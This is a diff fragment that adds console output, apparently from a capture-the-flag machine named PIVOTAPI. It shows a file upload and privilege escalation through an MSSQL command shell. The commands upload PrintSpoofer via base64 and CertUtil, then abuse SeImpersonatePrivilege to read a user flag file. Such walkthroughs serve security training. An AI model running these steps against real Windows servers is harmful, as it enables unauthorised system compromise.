@@ -1,3 +1,15 @@
+CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\TEMP> UPLOAD printspoofer/PrintSpoofer.exe C:\TEMP\printspoofer.exe
+Uploading printspoofer/PrintSpoofer.exe to C:\TEMP\printspoofer.exe
+mssql_shell.py:52: DeprecationWarning: encodestring() is a deprecated alias since 3.1, use encodebytes()
+  b64enc_data = b"".join(base64.encodestring(data).split()).decode()
+Data length (b64-encoded): 35.3359375KB
+100%|███████████████████████████████████████████████████| 40.0/40.0 [00:08<00:00,  4.77KB/s]
+Longitud de entrada = 36208
+Longitud de salida = 27136
+CertUtil: -decode comando completado correctamente.
+MD5 hashes match: 755af01d6f1c793d28275ec8b914687c
+*** UPLOAD PROCEDURE FINISHED ***
+
 CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\TEMP> printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
